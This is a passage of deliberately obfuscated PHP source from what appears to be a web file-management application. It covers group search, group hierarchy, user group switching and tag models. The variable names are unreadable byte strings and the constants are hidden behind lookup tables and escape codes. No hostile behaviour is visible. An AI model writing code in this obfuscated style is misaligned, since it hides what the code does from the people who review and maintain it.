= implode($Éì«˜½[1944], $›Ñ¸Ò÷); $şßÕ¡‰ş = $this->query($›Ñ¸Ò÷); if (!$şßÕ¡‰ş) { return array(); } $¡Ñ¤œïÓ = array_to_keyvalue($şßÕ¡‰ş, $Éì«˜½[12], $Éì«˜½[1851]); return array_unique($¡Ñ¤œïÓ); } public function listByID($úñãÆ») { $¦•ÆÖŠ =& $_SERVER[¡“ËÌ§œ]; if (!$úñãÆ») { return array(); } $Ÿ³ŒÄÈ = array($¦•ÆÖŠ[1851] => array($¦•ÆÖŠ[7], $úñãÆ»)); $Ûº†ö = $this->where($Ÿ³ŒÄÈ)->select(); $Ûº†ö = array_sort_keep($Ûº†ö, $¦•ÆÖŠ[1851], $úñãÆ»); $this->_listDataApply($Ûº†ö); return $Ûº†ö; } public function listSearch($æëĞ”è) { $Ó¥™¾Å³ =& $_SERVER[¡“ËÌ§œ]; $ĞË»óñ½ = $æëĞ”è[$Ó¥™¾Å³[1945]]; $±ÙäĞî = isset($æëĞ”è[$Ó¥™¾Å³[1946]]) ? $æëĞ”è[$Ó¥™¾Å³[1946]] : !1; if (!trim($ĞË»óñ½)) { return !1; } $ĞË»óñ½ = str_replace($Ó¥™¾Å³[1947], $Ó¥™¾Å³[1948], $ĞË»óñ½); $ò¯õ™¯× = array($Ó¥™¾Å³[1851] => array($Ó¥™¾Å³[412], "{$ĞË»óñ½}\45"), $Ó¥™¾Å³[32] => array($Ó¥™¾Å³[412], "\45{$ĞË»óñ½}\45"), $Ó¥™¾Å³[1020] => $Ó¥™¾Å³[1949]); if ($±ÙäĞî) { $¦„·ûš = $this->getInfoSimple($±ÙäĞî); $’¥ùŸ˜ù = $¦„·ûš[$Ó¥™¾Å³[549]] . $±ÙäĞî . $Ó¥™¾Å³[579]; $ò¯õ™¯× = array($ò¯õ™¯×, array($Ó¥™¾Å³[549] => array($Ó¥™¾Å³[412], $’¥ùŸ˜ù))); } $ò¯õ™¯× = $this->parseWhereLike($ò¯õ™¯×); $¡úß†ò = $this->_makeOrder()->where($ò¯õ™¯×)->selectPage(20); $¡úß†ò = $¡úß†ò ? $¡úß†ò : array($Ó¥™¾Å³[398] => array(), $Ó¥™¾Å³[395] => array()); if (!$¡úß†ò || count($¡úß†ò[$Ó¥™¾Å³[398]]) < 5 && Input::check($ĞË»óñ½, $Ó¥™¾Å³[347])) { $ÍÁü–ı¨ = $this->groupChildrenAll($±ÙäĞî); $úˆ‹’ª = $this->_searchFromMeta($Ó¥™¾Å³[502], $ĞË»óñ½, 10, $ÍÁü–ı¨); $é³êÚô† = $this->_searchFromMeta($Ó¥™¾Å³[503], $ĞË»óñ½, 10, $ÍÁü–ı¨); $ÔâÁ„Ş÷ = array_merge($úˆ‹’ª, $é³êÚô†, $¡úß†ò[$Ó¥™¾Å³[398]]); $¡úß†ò[$Ó¥™¾Å³[398]] = array_unique_by_key($ÔâÁ„Ş÷, $Ó¥™¾Å³[1851]); $¡úß†ò[$Ó¥™¾Å³[395]][$Ó¥™¾Å³[396]] = count($¡úß†ò[$Ó¥™¾Å³[398]]); $¡úß†ò[$Ó¥™¾Å³[395]][$Ó¥™¾Å³[397]] = ceil($¡úß†ò[$Ó¥™¾Å³[395]][$Ó¥™¾Å³[396]] / $¡úß†ò[$Ó¥™¾Å³[395]][$Ó¥™¾Å³[392]]); } $this->_listDataApply($¡úß†ò[$Ó¥™¾Å³[398]]); return $¡úß†ò; } protected function groupChildrenAll($ñ¶£÷») { $äĞˆ…Å =& $_SERVER[¡“ËÌ§œ]; if (!$ñ¶£÷») { return !1; } if (is_string($ñ¶£÷»)) { $ñ¶£÷» = array($ñ¶£÷»); } $¨‚ÅöºŸ = $ñ¶£÷»; foreach ($ñ¶£÷» as $Äªßß˜Ä) { $¼ÎÑÖğÊ = $this->getInfoSimple($Äªßß˜Ä); $ëĞÁœ«î = array($äĞˆ…Å[549] => array($äĞˆ…Å[412], $¼ÎÑÖğÊ[$äĞˆ…Å[549]] . $Äªßß˜Ä . $äĞˆ…Å[579])); $îøÍä©‰ = $this->field($äĞˆ…Å[1851])->where($ëĞÁœ«î)->select(); $¨‚ÅöºŸ = array_merge($¨‚ÅöºŸ, array_to_keyvalue($îøÍä©‰, $äĞˆ…Å[12], $äĞˆ…Å[1851])); } return array_unique($¨‚ÅöºŸ); } private function _searchFromMeta($¦¼Ûº², $ÑŠùÊÆ›, $÷ãà×â…, $–Ë¥¬€) { $åûÑ·Ø± =& $_SERVER[¡“ËÌ§œ]; $ÑŠùÊÆ› = strtolower($ÑŠùÊÆ›); $äµûù»Ñ = array($åûÑ·Ø±[94] => $¦¼Ûº², $åûÑ·Ø±[403] => array($åûÑ·Ø±[412], "\x25{$ÑŠùÊÆ›}\x25")); $äµûù»Ñ = $this->parseWhereLike($äµûù»Ñ); if ($–Ë¥¬€) { $äµûù»Ñ[$åûÑ·Ø±[1851]] = array($åûÑ·Ø±[7], $–Ë¥¬€); } $à»Èø = Model($åûÑ·Ø±[1950])->where($äµûù»Ñ)->limit($÷ãà×â…)->select(); if (!$à»Èø) { return array(); } $à»Èø = array_to_keyvalue($à»Èø, $åûÑ·Ø±[12], $åûÑ·Ø±[1851]); $æ»ØÖÉ = $this->where(array($åûÑ·Ø±[1939] => array($åûÑ·Ø±[7], $à»Èø)))->select(); if (!$æ»ØÖÉ) { return array(); } return $æ»ØÖÉ; } protected function _listDataApplyItem($ñüİ·Ì†) { $¤À•àë = array($ñüİ·Ì†); $this->_listDataApply($¤À•àë); return $¤À•àë[0]; } protected function _listDataApply(&$›¤ÌğíÊ) { $¥í«£¬´ =& $_SERVER[¡“ËÌ§œ]; if (!$›¤ÌğíÊ) { return; } $­ƒ¥úî¿ = array_to_keyvalue($›¤ÌğíÊ, $¥í«£¬´[12], $¥í«£¬´[1851]); $this->_listAppendChildren($›¤ÌğíÊ); $this->_listAppendChildrenMember($›¤ÌğíÊ); $this->_listAppendMeta($›¤ÌğíÊ, $­ƒ¥úî¿); $this->_listAppendParent($›¤ÌğíÊ); $this->_listAppendSourceRoot($›¤ÌğíÊ, $­ƒ¥úî¿); } private function _listAppendChildren(&$éÆçî¥˜) { $ø›øÏ‘ö =& $_SERVER[¡“ËÌ§œ]; $ãğ…«€» = array_to_keyvalue($éÆçî¥˜, $ø›øÏ‘ö[12], $ø›øÏ‘ö[1851]); $ı¡ÑÂı = array($ø›øÏ‘ö[470] => array($ø›øÏ‘ö[7], $ãğ…«€»)); $øåÂÕ¸ = array($ø›øÏ‘ö[470], $ø›øÏ‘ö[1951] => $ø›øÏ‘ö[529]); $æÚ»õš® = $this->field($øåÂÕ¸)->where($ı¡ÑÂı)->group($ø›øÏ‘ö[470])->select(); $ş¯ÅåÑ¹ = array_to_keyvalue($æÚ»õš®, $ø›øÏ‘ö[470], $ø›øÏ‘ö[529]); foreach ($éÆçî¥˜ as &$€¹€ŠÑ) { $Ë‰ÔÒíƒ = $€¹€ŠÑ[$ø›øÏ‘ö[1851]]; $€¹€ŠÑ[$ø›øÏ‘ö[1952]] = isset($ş¯ÅåÑ¹[$Ë‰ÔÒíƒ]) ? intval($ş¯ÅåÑ¹[$Ë‰ÔÒíƒ]) : !1; } unset($€¹€ŠÑ); } private function _listAppendChildrenMember(&$€öĞƒ¾Ò) { $øÅœşÃ =& $_SERVER[¡“ËÌ§œ]; $‡íüúİŠ = array_to_keyvalue($€öĞƒ¾Ò, $øÅœşÃ[12], $øÅœşÃ[1851]); $šÖƒ×Í­ = array($øÅœşÃ[1851] => array($øÅœşÃ[7], $‡íüúİŠ)); $ÖıÅ§ğ… = array($øÅœşÃ[1851], $øÅœşÃ[1951] => $øÅœşÃ[529]); $ÔÜ¾… = Model($øÅœşÃ[1941])->field($ÖıÅ§ğ…)->where($šÖƒ×Í­)->group($øÅœşÃ[1851])->select(); $ç¯õ÷êÜ = array_to_keyvalue($ÔÜ¾…, $øÅœşÃ[1851], $øÅœşÃ[529]); foreach ($€öĞƒ¾Ò as &$“˜”Ë ) { $¼¾›ëş§ = $“˜”Ë [$øÅœşÃ[1851]]; $“˜”Ë [$øÅœşÃ[1953]] = isset($ç¯õ÷êÜ[$¼¾›ëş§]) ? intval($ç¯õ÷êÜ[$¼¾›ëş§]) : !1; } unset($“˜”Ë ); } private function _listAppendMeta(&$¦å÷ÂäÖ, $¡ëó£’Ä) { $ÂôÆØ£ =& $_SERVER[¡“ËÌ§œ]; $“šİÎ“¶ = array($ÂôÆØ£[1851] => array($ÂôÆØ£[7], $¡ëó£’Ä)); $Ä‘È­¢Ÿ = Model($ÂôÆØ£[1940])->where($“šİÎ“¶)->select(); $Ä‘È­¢Ÿ = array_to_keyvalue_group($Ä‘È­¢Ÿ, $ÂôÆØ£[1851]); foreach ($Ä‘È­¢Ÿ as &$¨‹ù‡œÓ) { $¨‹ù‡œÓ = array_to_keyvalue($¨‹ù‡œÓ, $ÂôÆØ£[94], $ÂôÆØ£[403]); } unset($¨‹ù‡œÓ); foreach ($¦å÷ÂäÖ as &$ÄË¥´îÊ) { $ÄË¥´îÊ[$ÂôÆØ£[504]] = array(); if (isset($Ä‘È­¢Ÿ[$ÄË¥´îÊ[$ÂôÆØ£[1851]]])) { $ÄË¥´îÊ[$ÂôÆØ£[504]] = $Ä‘È­¢Ÿ[$ÄË¥´îÊ[$ÂôÆØ£[1851]]]; } } unset($ÄË¥´îÊ); } protected function parentLevelArray($»¦Ûè‹¯) { $â×Óô©ˆ =& $_SERVER[¡“ËÌ§œ]; $»¦Ûè‹¯ = explode($â×Óô©ˆ[50], trim($»¦Ûè‹¯, $â×Óô©ˆ[50])); $»¦Ûè‹¯ = array_remove_value($»¦Ûè‹¯, $â×Óô©ˆ[198]); return $»¦Ûè‹¯; } protected function parentInGroup($Ğ“¬”ü, $Åà¹•ì) { $Ó™ƒø¿ç =& $_SERVER[¡“ËÌ§œ]; $ğÙ–îÂ‡ = $this->getInfoSimple($Ğ“¬”ü); if (!$ğÙ–îÂ‡) { return !0; } $ë÷·²Äë = $this->parentLevelArray($ğÙ–îÂ‡[$Ó™ƒø¿ç[549]]); $ë÷·²Äë[] = $Ğ“¬”ü; foreach ($ë÷·²Äë as $Ğ“¬”ü) { if (in_array($Ğ“¬”ü . $Ó™ƒø¿ç[12], $Åà¹•ì)) { return !0; } } return !1; } private function _listAppendParent(&$ì‰²Áİ«) { $éÔ´Åã =& $_SERVER[¡“ËÌ§œ]; $ó«’“ä = array(); foreach ($ì‰²Áİ« as &$¢ã®şûå) { $ó«’“ä[$¢ã®şûå[$éÔ´Åã[1851]]] = $¢ã®şûå[$éÔ´Åã[32]]; $Ëêñ„éõ = $this->parentLevelArray($¢ã®şûå[$éÔ´Åã[549]]); foreach ($Ëêñ„éõ as $¦’¶Ëæ’) { if (!isset($ó«’“ä[$¦’¶Ëæ’])) { $ó«’“ä[$¦’¶Ëæ’] = 0; } } } unset($¢ã®şûå); foreach ($ó«’“ä as $úáµÔçŞ => $’Àú¡â) { if ($’Àú¡â) { continue; } $’×Ê¸¡İ = $this->getInfoSimple($úáµÔçŞ); $ó«’“ä[$úáµÔçŞ] = $’×Ê¸¡İ[$éÔ´Åã[32]]; } $ ÇÎ³ÎÕ = $GLOBALS[$éÔ´Åã[6]][$éÔ´Åã[89]][$éÔ´Åã[1954]]; if ($GLOBALS[$éÔ´Åã[532]] == $éÔ´Åã[88]) { $ ÇÎ³ÎÕ = !1; } foreach ($ì‰²Áİ« as &$¢ã®şûå) { $Ëêñ„éõ = $this->parentLevelArray($¢ã®şûå[$éÔ´Åã[549]]); $Ä·«Õã = $éÔ´Åã[12]; foreach ($Ëêñ„éõ as $úáµÔçŞ => $¦’¶Ëæ’) { if ($ ÇÎ³ÎÕ && $úáµÔçŞ == 0) { continue; } $Ä·«Õã .= $ó«’“ä[$¦’¶Ëæ’] . $éÔ´Åã[8]; } if ($Ëêñ„éõ) { $Ä·«Õã .= $¢ã®şûå[$éÔ´Åã[32]]; } $¢ã®şûå[$éÔ´Åã[554]] = str_replace($éÔ´Åã[557], $éÔ´Åã[8], $Ä·«Õã); } unset($¢ã®şûå); } private function _listAppendSourceRoot(&$½Â…ç, $ôŸ¿…òÛ) { $¹´ó™Ï¼ =& $_SERVER[¡“ËÌ§œ]; $Ì¯½«ìš = Model($¹´ó™Ï¼[845])->listSourceRoot(SourceModel::TYPE_GROUP, $ôŸ¿…òÛ); $Ì¯½«ìš = array_to_keyvalue($Ì¯½«ìš, $¹´ó™Ï¼[534]); $Ì¯½«ìš = array_remove_key($Ì¯½«ìš, $¹´ó™Ï¼[534]); foreach ($½Â…ç as &$À‡½ï£Ş) { $À‡½ï£Ş[$¹´ó™Ï¼[87]] = $Ì¯½«ìš[$À‡½ï£Ş[$¹´ó™Ï¼[1851]]] ? $Ì¯½«ìš[$À‡½ï£Ş[$¹´ó™Ï¼[1851]]] : array(); } unset($À‡½ï£Ş); } protected function groupMerge($ı”ß ø) { $ı”ß ø = array_values(array_unique($ı”ß ø)); $ÀÕ’Úšƒ = array(); for ($·¹ÇÎşâ = 0; $·¹ÇÎşâ < count($ı”ß ø); $·¹ÇÎşâ++) { $Æºß”³ò = !1; for ($ñéÓø = 0; $ñéÓø < count($ı”ß ø); $ñéÓø++) { if ($·¹ÇÎşâ == $ñéÓø) { continue; } if ($this->isParentOf($ı”ß ø[$ñéÓø], $ı”ß ø[$·¹ÇÎşâ])) { $Æºß”³ò = !0; break; } } if (!$Æºß”³ò) { $ÀÕ’Úšƒ[] = $ı”ß ø[$·¹ÇÎşâ]; } } return $ÀÕ’Úšƒ; } protected function isParentOf($Á»ØËë¸, $èÛùÀÙ) { $ÎîË€Şº =& $_SERVER[¡“ËÌ§œ]; if (!$Á»ØËë¸ || !$èÛùÀÙ || $Á»ØËë¸ == $èÛùÀÙ) { return !1; } $ÛÁàá©ì = $this->getInfoSimple($Á»ØËë¸); $Ûä³Â = $this->getInfoSimple($èÛùÀÙ); $åÊïˆ¸û = $ÛÁàá©ì[$ÎîË€Şº[549]] . $Á»ØËë¸ . $ÎîË€Şº[50]; if (substr($Ûä³Â[$ÎîË€Şº[549]], 0, strlen($åÊïˆ¸û)) == $åÊïˆ¸û) { return !0; } return !1; } public function groupShowRoot($±³âÒÖ‡, $ÕÎÉ©±Ş = false) { $ä Ğ°š˜ =& $_SERVER[¡“ËÌ§œ]; $§ï¤£ù = $this->getInfo($±³âÒÖ‡); if (!$§ï¤£ù) { return array(); } $÷€¨¦îÙ = $this->parentLevelArray($§ï¤£ù[$ä Ğ°š˜[549]]); $³‰¶ñĞÙ = array($±³âÒÖ‡); if (count($÷€¨¦îÙ) == 0) { return $³‰¶ñĞÙ; } if ($ÕÎÉ©±Ş && count($÷€¨¦îÙ) == 1) { return $³‰¶ñĞÙ; } if (!$§ï¤£ù[$ä Ğ°š˜[504]] || !isset($§ï¤£ù[$ä Ğ°š˜[504]][$ä Ğ°š˜[1937]]) || $§ï¤£ù[$ä Ğ°š˜[504]][$ä Ğ°š˜[1937]] == $ä Ğ°š˜[1906]) { return $this->groupShowRoot($÷€¨¦îÙ[count($÷€¨¦îÙ) - 1], $ÕÎÉ©±Ş); } if ($§ï¤£ù[$ä Ğ°š˜[504]][$ä Ğ°š˜[1937]] == $ä Ğ°š˜[386]) { $ÌÉş×œÓ = explode($ä Ğ°š˜[50], $§ï¤£ù[$ä Ğ°š˜[504]][$ä Ğ°š˜[1938]]); if ($ÌÉş×œÓ) { $³‰¶ñĞÙ = array_merge($³‰¶ñĞÙ, $ÌÉş×œÓ); } } return $³‰¶ñĞÙ; } protected function resetParentLevel() { $íÕºïÈ =& $_SERVER[¡“ËÌ§œ]; $óµÔ®ı™ = $íÕºïÈ[1851]; $ß¦Á»·¥ = $this->select(); $ß¦Á»·¥ = array_to_keyvalue($ß¦Á»·¥, $óµÔ®ı™); foreach ($ß¦Á»·¥ as $œÄÊÎö) { $Öõƒ‡”æ = $œÄÊÎö; $ŸßÀÈ = array(); while ($Öõƒ‡”æ[$íÕºïÈ[470]] != 0) { $ŸßÀÈ[] = $Öõƒ‡”æ[$íÕºïÈ[470]]; $Öõƒ‡”æ = $ß¦Á»·¥[$Öõƒ‡”æ[$íÕºïÈ[470]]]; } $ŸßÀÈ[] = 0; $ŸßÀÈ = $íÕºïÈ[50] . implode($íÕºïÈ[50], array_reverse($ŸßÀÈ)) . $íÕºïÈ[50]; $this->setNamePinyin($œÄÊÎö[$óµÔ®ı™], $œÄÊÎö[$íÕºïÈ[32]]); $this->where(array($óµÔ®ı™ => $œÄÊÎö[$óµÔ®ı™]))->save(array($íÕºïÈ[618] => $ŸßÀÈ)); } return $ß¦Á»·¥; } public function groupNameAuto($È›‘øø, $Ç¥àŠ) { $›òÀ›é¡ =& $_SERVER[¡“ËÌ§œ]; $–§µïÎõ = $this->where(array($›òÀ›é¡[439] => $È›‘øø))->getField($›òÀ›é¡[32], !0); if (!$–§µïÎõ || !in_array($Ç¥àŠ, $–§µïÎõ)) { return $Ç¥àŠ; } for ($ş…»‰ñ = 1; $ş…»‰ñ <= count($–§µïÎõ) + 1; $ş…»‰ñ++) { $ôµÂ±Õ = $Ç¥àŠ . "\50{$ş…»‰ñ}\x29"; if (!in_array($ôµÂ±Õ, $–§µïÎõ)) { return $ôµÂ±Õ; } } } public function groupSwitch($Ô¥ÁºÉ, $î­±²¼) { $Ÿ³öÅĞë =& $_SERVER[¡“ËÌ§œ]; $¹åºåÉ = array($Ÿ³öÅĞë[1851] => array($Ÿ³öÅĞë[7], array($Ô¥ÁºÉ, $î­±²¼))); $¬˜âÉÎ = $this->where($¹åºåÉ)->select(); $¬˜âÉÎ = array_to_keyvalue($¬˜âÉÎ, $Ÿ³öÅĞë[1851]); if (!isset($¬˜âÉÎ[$Ô¥ÁºÉ]) || !isset($¬˜âÉÎ[$î­±²¼]) || $¬˜âÉÎ[$Ô¥ÁºÉ][$Ÿ³öÅĞë[470]] == 0) { return !1; } $¹åºåÉ = array($Ÿ³öÅĞë[1851] => $Ô¥ÁºÉ); $’À¸§µ¾ = Model($Ÿ³öÅĞë[1941])->where($¹åºåÉ)->select(); if (!$’À¸§µ¾) { $’À¸§µ¾ = array(); } foreach ($’À¸§µ¾ as $ª®½¼¶) { $Æ‰ŸíÇ = $ª®½¼¶[$Ÿ³öÅĞë[1661]]; $¹åºåÉ = array($Ÿ³öÅĞë[1661] => $Æ‰ŸíÇ, $Ÿ³öÅĞë[1851] => $î­±²¼); $òˆØ”â = Model($Ÿ³öÅĞë[1941])->where($¹åºåÉ)->find(); if (!$òˆØ”â) { $è³©Ò‰ê = array($î­±²¼ => $ª®½¼¶[$Ÿ³öÅĞë[1955]]); Model($Ÿ³öÅĞë[563])->userGroupAdd($Æ‰ŸíÇ, $è³©Ò‰ê); } Model($Ÿ³öÅĞë[563])->userGroupRemove($Æ‰ŸíÇ, $Ô¥ÁºÉ); } $¹åºåÉ = array($Ÿ³öÅĞë[449] => 2, $Ÿ³öÅĞë[470] => 0, $Ÿ³öÅĞë[448] => 1, $Ÿ³öÅĞë[534] => array($Ÿ³öÅĞë[7], array($Ô¥ÁºÉ, $î­±²¼))); $¢–ÕÆÊï = Model($Ÿ³öÅĞë[845])->where($¹åºåÉ)->field($Ÿ³öÅĞë[1956])->select(); $¢–ÕÆÊï = array_to_keyvalue($¢–ÕÆÊï, $Ÿ³öÅĞë[534], $Ÿ³öÅĞë[440]); $«ş³é–§ = !empty($¢–ÕÆÊï[$Ô¥ÁºÉ]) ? $¢–ÕÆÊï[$Ô¥ÁºÉ] : !1; if ($«ş³é–§) { if (!$¢–ÕÆÊï[$î­±²¼]) { $¢–ÕÆÊï[$î­±²¼] = Model($Ÿ³öÅĞë[845])->groupRootAdd($î­±²¼); } $ÂòßŠï = $¢–ÕÆÊï[$î­±²¼]; $¹åºåÉ = array($Ÿ³öÅĞë[470] => $«ş³é–§); $¢–ÕÆÊï = Model($Ÿ³öÅĞë[845])->where($¹åºåÉ)->field($Ÿ³öÅĞë[1957])->select(); if (!$¢–ÕÆÊï) { $¢–ÕÆÊï = array(); } Model($Ÿ³öÅĞë[845])->moveClearAuth = !1; foreach ($¢–ÕÆÊï as $®¡Ù†ß×) { $ˆ¿“×ã = $®¡Ù†ß×[$Ÿ³öÅĞë[448]] == $Ÿ³öÅĞë[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Ÿ³öÅĞë[845])->move($®¡Ù†ß×[$Ÿ³öÅĞë[440]], $ÂòßŠï, $ˆ¿“×ã); } Model($Ÿ³öÅĞë[845])->moveClearAuth = !0; $¹åºåÉ = array($Ÿ³öÅĞë[449] => 2, $Ÿ³öÅĞë[534] => $Ô¥ÁºÉ); $„£»¤–è = array($Ÿ³öÅĞë[534] => $î­±²¼); Model($Ÿ³öÅĞë[1958])->where($¹åºåÉ)->save($„£»¤–è); Model($Ÿ³öÅĞë[1959])->where($¹åºåÉ)->save($„£»¤–è); } $this->_changeChildLevel($¬˜âÉÎ[$Ô¥ÁºÉ], $¬˜âÉÎ[$î­±²¼], !0); $this->where(array($Ÿ³öÅĞë[470] => $Ô¥ÁºÉ))->save(array($Ÿ³öÅĞë[470] => $î­±²¼)); $this->_clearChildrenCache($¬˜âÉÎ[$î­±²¼]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\x66\141\166"; protected function cacheFunctionAlias($ªî»Û®ã) { $ÙØ¹ö¿ =& $_SERVER[¡“ËÌ§œ]; return array($ÙØ¹ö¿[1960] => array($ªî»Û®ã[0], $ÙØ¹ö¿[1961]), $ÙØ¹ö¿[1962] => array($ªî»Û®ã[0], $ÙØ¹ö¿[1963])); } protected function get($¾ª›ëê­) { $å“â¶¯¯ =& $_SERVER[¡“ËÌ§œ]; $ô·«‚¤ö = Model($å“â¶¯¯[550])->metaGet($¾ª›ëê­, $å“â¶¯¯[1964]); $óª”ôçÏ = json_decode($ô·«‚¤ö, !0); return $óª”ôçÏ ? $óª”ôçÏ : array($å“â¶¯¯[1965] => $å“â¶¯¯[88], $å“â¶¯¯[398] => array()); } protected function set($Ş¤œ„¿ô, $û™ª³ŠÛ) { $¥ğŞüşÏ =& $_SERVER[¡“ËÌ§œ]; $û™ª³ŠÛ = $û™ª³ŠÛ ? $û™ª³ŠÛ : array($¥ğŞüşÏ[1965] => $¥ğŞüşÏ[88], $¥ğŞüşÏ[398] => array()); return Model($¥ğŞüşÏ[550])->metaSet($Ş¤œ„¿ô, $¥ğŞüşÏ[1964], json_encode($û™ª³ŠÛ)); } protected function getByTagID($›Áçé®è, $«ÜÉÎì) { $ÛÒÀ„ïÔ =& $_SERVER[¡“ËÌ§œ]; if (!$›Áçé®è || !$«ÜÉÎì) { return !1; } if (!Model($ÛÒÀ„ïÔ[550])->getInfoSimple($›Áçé®è)) { return !1; } $øé÷¨ì = $this->get($›Áçé®è); if (!$øé÷¨ì || !isset($øé÷¨ì[$ÛÒÀ„ïÔ[398]])) { return !1; } $¶¹ËÄëä = array_find_by_field($øé÷¨ì[$ÛÒÀ„ïÔ[398]], $ÛÒÀ„ïÔ[437], $«ÜÉÎì); return is_array($¶¹ËÄëä) ? $¶¹ËÄëä : !1; } public function listSource($–©×ÃÃ¡, $¯¡ ûµÍ) { $²ëõå¡š =& $_SERVER[¡“ËÌ§œ]; if ($¯¡ ûµÍ && !is_array($¯¡ ûµÍ)) { $¯¡ ûµÍ = array($¯¡ ûµÍ); } $ˆ‚Úéûİ = $this->listData($–©×ÃÃ¡); $‡¡ãïş = array(); foreach ($ˆ‚Úéûİ as $µ×Öğ™¸) { $ËÑö¬‡  = $µ×Öğ™¸[$²ëõå¡š[84]]; if (!$ËÑö¬‡ ) { continue; } if (!isset($‡¡ãïş[$ËÑö¬‡ ])) { $‡¡ãïş[$ËÑö¬‡ ] = array(); } $‡¡ãïş[$ËÑö¬‡ ][] = $µ×Öğ™¸[$²ëõå¡š[464]]; } $Ñµšà±² = array(); foreach ($‡¡ãïş as $Ú³‹¾›é => $äé‘ÀÍ‡) { $­Á¼€ıÈ = !0; if (!$¯¡ ûµÍ) { $Ñµšà±²[] = $Ú³‹¾›é; continue; } foreach ($¯¡ ûµÍ as $ñµÃÙŒ¶) { if (!in_array($ñµÃÙŒ¶, $äé‘ÀÍ‡)) { $­Á¼€ıÈ = !1; break; } } if ($­Á¼€ıÈ) { $Ñµšà±²[] = $Ú³‹¾›é; } } if (!$Ñµšà±²) { return array(); } $¤·÷¢ = array($²ëõå¡š[455] => array($²ëõå¡š[456], $Ñµšà±²), $²ëõå¡š[534] => $–©×ÃÃ¡, $²ëõå¡š[449] => SourceModel::TYPE_GROUP); $…ãàîò¯ = Model($²ëõå¡š[1353])->listSource($¤·÷¢); if (!$…ãàîò¯ || count($Ñµšà±²) == $…ãàîò¯[$²ëõå¡š[395]][$²ëõå¡š[396]]) { return $…ãàîò¯; } $¼Éµº–ø = array(); $û¡±¬¸â = array_to_keyvalue($…ãàîò¯[$²ëõå¡š[82]], $²ëõå¡š[12], $²ëõå¡š[440]); $æáä€ª± = array_to_keyvalue($…ãàîò¯[$²ëõå¡š[83]], $²ëõå¡š[12], $²ëõå¡š[440]); $ş–Œïìô = array_merge($æáä€ª±, $û¡±¬¸â); foreach ($Ñµšà±² as $ËÑö¬‡ ) { if (!in_array($ËÑö¬‡ , $ş–Œïìô)) { $¼Éµº–ø[] = $ËÑö¬‡ ; } } if ($¼Éµº–ø) { $this->removeBySource($–©×ÃÃ¡, $¼Éµº–ø); } return $…ãàîò¯; } protected function listData($èš”“ Ê) { $€æµÈ¸ =& $_SERVER[¡“ËÌ§œ]; $åà‚È¥À = array($€æµÈ¸[1652] => 0, $€æµÈ¸[521] => array($€æµÈ¸[1966], 0), $€æµÈ¸[460] => $€æµÈ¸[1967] . $èš”“ Ê); $Ö–÷÷ìŒ = $€æµÈ¸[1968]; $Û¡Ë—Şğ = $this->field($Ö–÷÷ìŒ)->where($åà‚È¥À)->order($€æµÈ¸[1969])->select(); return $Û¡Ë—Şğ ? $Û¡Ë—Şğ : array(); } protected function addToTag($¿Ê¤ù, $şÁ©×…Í, $ã±Èö¥) { $‘º‰İå =& $_SERVER[¡“ËÌ§œ]; if (!$this->getByTagID($¿Ê¤ù, $ã±Èö¥) || !$şÁ©×…Í) { return !1; } if (!Model($‘º‰İå[845])->pathInfo($şÁ©×…Í)) { return !1; } $âÏÂ´Û§ = array($‘º‰İå[1652] => 0, $‘º‰İå[521] => $ã±Èö¥, $‘º‰İå[459] => $şÁ©×…Í, $‘º‰İå[460] => $‘º‰İå[1970] . $¿Ê¤ù, $‘º‰İå[458] => $‘º‰İå[12], $‘º‰İå[1855] => 0); if ($this->where($âÏÂ´Û§)->find()) { return !1; } return $this->add($âÏÂ´Û§); } protected function removeFromTag($ÓñâëÑğ, $û¤“ìàŸ, $«şÍ“Ä) { $¾¸•—¯ò =& $_SERVER[¡“ËÌ§œ]; if (!$this->getByTagID($ÓñâëÑğ, $«şÍ“Ä) || !$û¤“ìàŸ) { return !1; } if (is_array($û¤“ìàŸ)) { $û¤“ìàŸ = array($¾¸•—¯ò[7], $û¤“ìàŸ); } $¯ô”şƒ© = array($¾¸•—¯ò[1652] => 0, $¾¸•—¯ò[521] => $«şÍ“Ä, $¾¸•—¯ò[460] => $¾¸•—¯ò[1970] . $ÓñâëÑğ, $¾¸•—¯ò[459] => $û¤“ìàŸ); return $this->where($¯ô”şƒ©)->delete(); } protected function removeByTag($ ÎÒÚÄİ, $©³¡¿¬„) { $ü¥Çª” =& $_SERVER[¡“ËÌ§œ]; if (!$this->getByTagID($ ÎÒÚÄİ, $©³¡¿¬„)) { return !1; } $­çåã‰Ï = array($ü¥Çª”[1652] => 0, $ü¥Çª”[521] => $©³¡¿¬„, $ü¥Çª”[460] => $ü¥Çª”[1970] . $ ÎÒÚÄİ); return $this->where($­çåã‰Ï)->delete(); } protected function removeBySource($¶ÉâŠ««, $½µ˜Ï¦¸) { $£ŠŸÙÑ =& $_SERVER[¡“ËÌ§œ]; if (!$¶ÉâŠ«« || !$½µ˜Ï¦¸) { return !1; } if (is_array($½µ˜Ï¦¸)) { $½µ˜Ï¦¸ = array($£ŠŸÙÑ[7], $½µ˜Ï¦¸); } $Ã’úÉŒò = array($£ŠŸÙÑ[1652] => 0, $£ŠŸÙÑ[459] => $½µ˜Ï¦¸, $£ŠŸÙÑ[521] => array($£ŠŸÙÑ[1034], 0), $£ŠŸÙÑ[460] => $£ŠŸÙÑ[1970] . $¶ÉâŠ««); return $this->where($Ã’úÉŒò)->delete(); } } goto aÎˆ‰í–æ; aùöÛôí™Š: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\x65\x6d\137\x6f\160\164\151\157\x6e"; protected $jsonField = array("\x6d\145\156\x75", "\x72\157\154\145", "\162\x6f\154\145\107\x72\157\x75\160", "\162\145\x67\x69\163\164", "\145\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($¡ïÃşÈ) { return "\123\x79\x73\x74\145\x6d\117\x70\164\151\157\156\137{$¡ïÃşÈ}"; } protected function optionDefault($±¸¬£í« = '') { $ÍöØæ =& $_SERVER[¡“ËÌ§œ]; if ($±¸¬£í« == $ÍöØæ[12]) { return $GLOBALS[$ÍöØæ[6]][$ÍöØæ[410]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\56\x72\157\x6c\145\114\151\163\x74"; public $field = array("\x6e\x61\x6d\145", "\141\165\x74\150", "\x6c\x61\142\x65\154", "\144\151\163\x70\x6c\x61\x79", "\163\x79\x73\164\x65\x6d", "\144\x65\x73\143", "\x69\x67\x6e\x6f\x72\145\105\x78\x74", 